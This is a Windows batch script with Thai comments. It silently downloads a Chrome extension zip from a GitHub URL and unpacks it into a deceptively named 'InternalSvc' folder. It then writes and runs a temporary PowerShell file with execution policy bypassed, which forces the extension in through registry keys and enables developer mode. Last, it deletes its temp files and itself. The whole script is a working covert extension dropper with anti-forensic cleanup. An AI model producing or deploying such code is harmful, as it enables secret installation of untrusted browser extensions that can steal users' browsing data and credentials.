@echo off
setlocal enabledelayedexpansion

:: 1. ตั้งค่าพื้นฐาน
set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: 2. ดาวน์โหลดและแตกไฟล์ (PowerShell แบบรวมคำสั่ง)
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'; Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"

:: 3. จัดการโครงสร้างโฟลเดอร์ (ดึงไฟล์ออกมาชั้นนอก)
if exist "%TARGET_DIR%\temp_ext" (
    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
        xcopy "%%D\*" "%TARGET_DIR%\%EXT_ID%\" /s /e /y
    )
    rd /s /q "%TARGET_DIR%\temp_ext"
    del /f /q "%TARGET_DIR%\ext.zip"
)

:: 4. [ไม้ตาย] สั่งเขียน Registry ผ่าน PowerShell แบบ Force
:: เราจะสร้างไฟล์ .ps1 สั้นๆ ใน Temp แล้วรันเพื่อเขียน Registry โดยเฉพาะ
echo $registryPath = 'HKCU:\Software\Google\Chrome\Extensions\%EXT_ID%' > %TEMP%\reg_fix.ps1
echo if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force } >> %TEMP%\reg_fix.ps1
echo Set-ItemProperty -Path $registryPath -Name 'path' -Value '%TARGET_DIR%\%EXT_ID%' >> %TEMP%\reg_fix.ps1
echo Set-ItemProperty -Path $registryPath -Name 'version' -Value '1.0' >> %TEMP%\reg_fix.ps1
echo $devModePath = 'HKCU:\Software\Google\Chrome\ExtensionsSettings' >> %TEMP%\reg_fix.ps1
echo if (-not (Test-Path $devModePath)) { New-Item -Path $devModePath -Force } >> %TEMP%\reg_fix.ps1
echo Set-ItemProperty -Path $devModePath -Name 'ui_developer_mode' -Value 1 >> %TEMP%\reg_fix.ps1

:: รันไฟล์แก้ไข Registry ที่เราเพิ่งสร้าง
powershell -ExecutionPolicy Bypass -File %TEMP%\reg_fix.ps1

:: ล้างไฟล์ขยะ
del %TEMP%\reg_fix.ps1

:: 5. ลบตัวเองทิ้ง
(goto) 2>nul & del "%~f0"
